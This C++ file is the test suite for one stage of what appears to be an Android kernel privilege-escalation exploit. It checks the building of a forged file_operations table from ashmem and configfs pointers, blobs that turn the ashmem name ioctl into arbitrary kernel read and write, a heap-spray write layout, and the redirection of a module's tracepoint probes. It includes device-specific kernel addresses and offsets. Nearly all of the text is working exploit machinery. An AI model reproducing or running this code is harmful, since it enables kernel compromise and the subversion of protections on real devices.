/*
 * Host test for the CFI stage's pure encoders plus its payload invariant.
 *
 * These are fixed vectors, not a re-derivation: every expected offset below was
 * cross-checked against the kernel sources (6.6 `fs/configfs/file.c`,
 * `include/linux/miscdevice.h`, `include/linux/fs.h`) and against this device's
 * own recovered kallsyms. See the batch evidence files.
 */

#include "kernel/constants.hpp"
#include "kernel/target.h"
#include "memory/payload_builder.h"
#include "session/backend/cfi_layout.hpp"

#include <array>
#include <cstdint>
#include <cstdio>
#include <cstring>

namespace {
    namespace cfi = ghostlock::session::backend;
    namespace memory = ghostlock::memory;

    int32_t failures = 0;

    void expect(bool condition, const char *what) {
        if (!condition) {
            std::printf("FAIL %s\n", what);
            ++failures;
        }
    }

    uint64_t load64(const unsigned char *p, size_t off) {
        uint64_t value = 0;
        std::memcpy(&value, p + off, sizeof(value));
        return value;
    }

    /* The addresses used here are the ones measured on PD2463, so the vectors
     * also catch an accidental byte-order or slot-order regression. */
    cfi::CfiSymbols fixed_symbols() {
        cfi::CfiSymbols symbols{};
        symbols.ashmem_ioctl = 0xffffffc080c814b4ULL;
        symbols.ashmem_compat_ioctl = 0xffffffc080c81b70ULL;
        symbols.ashmem_mmap = 0xffffffc080c81bc4ULL;
        symbols.ashmem_open = 0xffffffc080c81de4ULL;
        symbols.ashmem_release = 0xffffffc080c81e6cULL;
        symbols.ashmem_show_fdinfo = 0xffffffc080c81ef8ULL;
        symbols.copy_splice_read = 0xffffffc0804113d4ULL;
        symbols.configfs_bin_read_iter = 0xffffffc08048cedcULL;
        symbols.configfs_bin_write_iter = 0xffffffc08048d0e4ULL;
        symbols.llseek_after_erase = 0xffffffc0803c4174ULL;
        symbols.ashmem_fops = 0xffffffc0812ebb18ULL;
        return symbols;
    }

    void test_fake_fops_table() {
        std::array<unsigned char, 0x8000> page{};
        page.fill(0x41);
        /* The table address is derived from the page itself, exactly as the
         * real spray path does: a host test cannot hold a kernel high-half
         * address, so a synthetic one would only test the pointer arithmetic
         * of the test. */
        const uintptr_t page_base = reinterpret_cast<uintptr_t>(page.data());
        const uintptr_t fake_fops = page_base + memory::kFakeFopsTableOffset;
        const cfi::CfiSymbols symbols = fixed_symbols();

        expect(cfi::build_fake_fops_table(
                   {page.data(), page.size()}, fake_fops, symbols),
               "build_fake_fops_table accepts an in-page table");
        const unsigned char *table = page.data() + memory::kFakeFopsTableOffset;

        expect(load64(table, 0x00) == 0, "owner slot is NULL");
        expect(load64(table, 0x08) == symbols.llseek_after_erase, "llseek = noop_llseek");
        expect(load64(table, 0x10) == 0, "read slot stays NULL");
        expect(load64(table, 0x18) == 0, "write slot stays NULL");
        expect(load64(table, 0x20) == symbols.configfs_bin_read_iter,
               "read_iter = configfs_bin_read_iter");
        expect(load64(table, 0x28) == symbols.configfs_bin_write_iter,
               "write_iter = configfs_bin_write_iter");
        expect(load64(table, 0x48) == symbols.ashmem_ioctl, "ioctl = ashmem_ioctl");
        expect(load64(table, 0x50) == symbols.ashmem_compat_ioctl,
               "compat_ioctl = compat_ashmem_ioctl");
        expect(load64(table, 0x58) == symbols.ashmem_mmap, "mmap = ashmem_mmap");
        expect(load64(table, 0x68) == symbols.ashmem_open, "open = ashmem_open");
        expect(load64(table, 0x78) == symbols.ashmem_release, "release = ashmem_release");
        expect(load64(table, 0xb8) == symbols.copy_splice_read,
               "splice_read = copy_splice_read");
        expect(load64(table, 0xd8) == symbols.ashmem_show_fdinfo,
               "show_fdinfo = ashmem_show_fdinfo");

        /* Nothing below the table or above its last slot may be touched. */
        expect(page[memory::kFakeFopsTableOffset - 1] == 0x41,
               "byte before the table is untouched");
        expect(page[memory::kFakeFopsTableOffset + memory::kFakeFopsTableBytes] == 0x41,
               "byte after the table is untouched");

        /* Every required slot must be a kernel pointer, not a fragment. */
        for (size_t off = 0; off < memory::kFakeFopsTableBytes; off += 8) {
            const uint64_t value = load64(table, off);
            if (value == 0) continue;
            expect(value >= 0xffffff8000000000ULL, "non-NULL slot is a kernel address");
        }

        /* Rejections: misaligned table, table that would run off the page, and a
         * table placed before the page. */
        expect(!cfi::build_fake_fops_table({page.data(), page.size()},
                                           fake_fops + 4, symbols),
               "misaligned table is refused");
        expect(!cfi::build_fake_fops_table({page.data(), page.size()},
                                           page_base + page.size() - 8, symbols),
               "table that does not fit is refused");
        expect(!cfi::build_fake_fops_table({page.data(), page.size()},
                                           0xffffff8700000000ULL, symbols),
               "table outside the page is refused");

        expect(fixed_symbols().complete(), "a full symbol set reports complete");
        cfi::CfiSymbols partial = fixed_symbols();
        partial.configfs_bin_read_iter = 0;
        expect(!partial.complete(), "a missing read_iter reports incomplete");
    }

    void test_shape_write_blob() {
        constexpr uintptr_t target = 0xffffff800226b4e8ULL;
        const auto blob = cfi::build_shape_write_blob(target);
        /* blob offset = configfs_buffer offset - ASHMEM_NAME_PREFIX_LEN(11). */
        expect(load64(blob.data(), 0x58 - 11) == target, "bin_buffer = target");
        expect(load64(blob.data(), 0x60 - 11) == 0, "bin_buffer_size = 0");
        expect(load64(blob.data(), 0x64 - 11) == 0, "cb_max_size = 0");
        /* page / needs_read_fill belong to the read shape only: leaving them at
         * zero here would make a subsequent read point at address 0. */
        expect(load64(blob.data(), 0x10 - 11) == 0, "write shape leaves page zeroed");

        /* The blob must stay inside the 256-byte window the ioctl copies, and
         * inside the window `set_name` actually writes (name + 11 .. name + 267). */
        expect(cfi::kShapeBlobSize <= 256, "shape blob fits the ioctl buffer");
        const size_t highest = 0x64 - 11 + 4;
        expect(highest <= cfi::kShapeBlobSize, "highest write shape field is inside the blob");
        expect(cfi::kShapeBlobSize + 11 <= 267, "shape blob stays inside asma->name");
    }

    void test_shape_read_blob() {
        constexpr uintptr_t target = 0xffffff800226b4f0ULL;
        constexpr size_t len = 8;
        const uint64_t pos = cfi::read_pos(len);
        expect(pos == 0x6d6873612f76655cULL, "read_pos is the upstream prefix count minus len");
        const auto blob = cfi::build_shape_read_blob(target, len);
        const uintptr_t page = load64(blob.data(), 0x10 - 11);
        expect(page == target - pos, "page = target - pos (no page rounding)");
        /* `configfs_bin_read_iter` ends in copy_to_iter(bin_buffer + ki_pos),
         * and the kernel passes that raw address to raw_copy_to_user, so the
         * source of the copy is exactly `page + pos`. */
        expect(page + pos == target, "page + ki_pos == target");
        expect(load64(blob.data(), 0x50 - 11) == 0, "needs_read_fill = 0 (skips the fill path)");
        /* The upstream formula rounds `page` down to a page boundary, which
         * moves every read by (ki_pos & 0xfff) = 0x55c bytes. Pin that we do
         * not do that. */
        expect(page != target - (pos & ~0xfffULL),
               "read shape must not round page down (upstream bug)");
        expect(cfi::read_pos(0x40) != pos, "read_pos tracks the requested length");
        /* A target too low to subtract from must reshape to nothing, never wrap
         * into a bogus source address. */
        const auto wrapped = cfi::build_shape_read_blob(0x1000, 8);
        expect(load64(wrapped.data(), 0x10 - 11) == 0, "underflowing read shape stays zeroed");
        for (size_t n : {size_t{8}, size_t{16}, size_t{32}, size_t{0x100}}) {
            constexpr uintptr_t probe = 0xffffff800226b4e8ULL;
            const auto probe_blob = cfi::build_shape_read_blob(probe, n);
            const uintptr_t probe_page = load64(probe_blob.data(), 0x10 - 11);
            expect(probe_page + cfi::read_pos(n) == probe,
                   "read shape round-trips for every supported length");
        }
    }

    /* Step 3: which tracepoint callbacks count as "a module probe". Only entries
     * whose address is outside the kernel image may be rewritten -- an in-image
     * entry is the kernel's own consumer (perf, BPF, function_graph), and
     * redirecting one would break kernel functionality rather than vr.ko. */
    void test_module_probe_selection() {
        constexpr uintptr_t image_lo = 0xffffffc080000000ULL;
        constexpr uintptr_t image_hi = 0xffffffc080000000ULL + 0x4000000ULL;
        constexpr uintptr_t funcs = 0xffffff8800200000ULL;
        constexpr size_t stride = 24;

        expect(cfi::image_contains_address(image_lo, image_lo, image_hi),
               "image bound is inclusive at the bottom");
        expect(!cfi::image_contains_address(image_hi, image_lo, image_hi),
               "image bound is exclusive at the top");
        expect(cfi::image_contains_address(image_hi - 8, image_lo, image_hi),
               "last image byte is inside");
        expect(!cfi::image_contains_address(0xffffffa800000000ULL, image_lo, image_hi),
               "a module address is outside");

        /* funcs[] as the kernel lays it out: three in-image consumers, then vr's
         * two module probes, then the terminating NULL. */
        const std::array<uintptr_t, 6> entries = {
            image_lo + 0x1234,                       /* perf */
            0xffffffa800100000ULL,                   /* vr: commit_creds probe */
            image_lo + 0x5678,                       /* bpf */
            0xffffffa800100060ULL,                   /* vr: sys_exit probe (delta 0x60) */
            image_lo + 0x9abc,                       /* function_graph */
            0,
        };
        const auto reader = [&](uintptr_t slot, uintptr_t &value) {
            if (slot < funcs) return false;
            const size_t index = static_cast<size_t>((slot - funcs) / stride);
            if (index >= entries.size()) return false;
            value = entries[index];
            return true;
        };

        uintptr_t probes[cfi::kMaxModuleProbes] = {};
        const size_t count = cfi::collect_module_probes(
            reader, funcs, stride, image_lo, image_hi, probes);
        expect(count == 2, "exactly the two module-region probes are collected");
        expect(probes[0] == 0xffffffa800100000ULL, "first module probe is vr's commit_creds");
        expect(probes[1] == 0xffffffa800100060ULL, "second module probe is vr's sys_exit");

        /* The fixed intra-module delta is what pairs them, and it must not be
         * applied to an in-image address. */
        expect(probes[1] - probes[0] == 0x60ULL, "the two probes differ by the known delta");

        /* An empty array (vr.ko absent) must report zero, not scan forever. */
        const auto empty_reader = [](uintptr_t, uintptr_t &value) {
            value = 0;
            return true;
        };
        expect(cfi::collect_module_probes(empty_reader, funcs, stride, image_lo, image_hi,
                                          probes) == 0,
               "a NULL first entry ends the walk immediately");

        /* A stride of zero must not loop. */
        expect(cfi::collect_module_probes(reader, funcs, 0, image_lo, image_hi, probes) == 0,
               "a zero stride is refused");

        /* A read failure stops the walk instead of reading past the array. */
        const auto failing_reader = [](uintptr_t, uintptr_t &) { return false; };
        expect(cfi::collect_module_probes(failing_reader, funcs, stride, image_lo, image_hi,
                                          probes) == 0,
               "an unreadable slot ends the walk");
    }

    /* The erase arm the hijack depends on stores node->__rb_parent_color into
     * *(node->rb_left), with node->rb_right == 0. Pin that the Fops layout puts
     * the table address in the first word and the destination in the third, so
     * the two encoders cannot drift apart. */
    void test_fops_write_arm_matches_table() {
        constexpr uintptr_t page_base = 0xffffff8800210000ULL;
        constexpr uintptr_t misc_fops = 0xffffff800226b4e8ULL;
        const memory::WriteRequest request = memory::WriteRequest::make(
            misc_fops, memory::WriteMode::Fops, false);
        const memory::PayloadWriteLayout layout = memory::payload_write_layout(
            &request, page_base, 0x1111, 0x2222, 0xffffff802abfd588ULL);
        const uintptr_t fake_fops = page_base + memory::kFakeFopsTableOffset;
        expect(layout.value == fake_fops, "Fops value is the forged table address");
        expect(layout.parent == fake_fops, "Fops erase arm parent is the value");
        expect(layout.right == 0, "Fops erase arm has no right child");
        expect(layout.left == misc_fops, "Fops erase arm left is the destination");
        expect(memory::payload_write_layout_matches_request(&request, &layout),
               "Fops layout matches its request");
        expect(memory::payload_write_layout_accepts_page(&request, &layout),
               "Fops layout is accepted for a page");
        /* The compact arm must refuse Fops as well: it would store the branch
         * node address into &ashmem_misc.fops instead of the table address. */
        {
            std::array<unsigned char, memory::kCompactWaiterBytes> compact_probe{};
            expect(!memory::encode_compact_waiter(
                       {reinterpret_cast<std::byte *>(compact_probe.data()),
                        compact_probe.size()},
                       request, layout),
                   "Fops is refused by the compact arm");
        }

        /* The table must live inside the first ORDER3 chunk, or the value we
         * store would address the wrong chunk of the same allocation. */
        expect(memory::kFakeFopsTableOffset + memory::kFakeFopsTableBytes <=
                   ghostlock::kernel::ORDER3_SIZE,
               "forged table fits in the first payload chunk");
        /* And clear of the fake task fields prepare_skb_payload fills. The
         * highest one is `pi_blocked_on`, which the device profile carries as
         * 2360 for this `task_struct`; the fake task starts at FAKE_TASK_OFF, so
         * the table must start after that field's 8 bytes. No overlap at all is
         * allowed: those fields are read at PI runtime, well after the page is
         * sprayed, so an overlap would corrupt the write that installs the
         * table rather than fail loudly here. */
        constexpr size_t kPiBlockedOnOff = 2360;
        expect(memory::kFakeFopsTableOffset >=
                   ghostlock::kernel::FAKE_TASK_OFF + kPiBlockedOnOff + sizeof(uint64_t),
               "forged table starts after the last fake task field");
    }
} // namespace

int main() {
    test_fake_fops_table();
    test_shape_write_blob();
    test_shape_read_blob();
    test_fops_write_arm_matches_table();
    test_module_probe_selection();
    if (failures != 0) {
        std::printf("cfi_stage_test: %d failure(s)\n", failures);
        return 1;
    }
    std::printf("cfi_stage_test: ok\n");
    return 0;
}
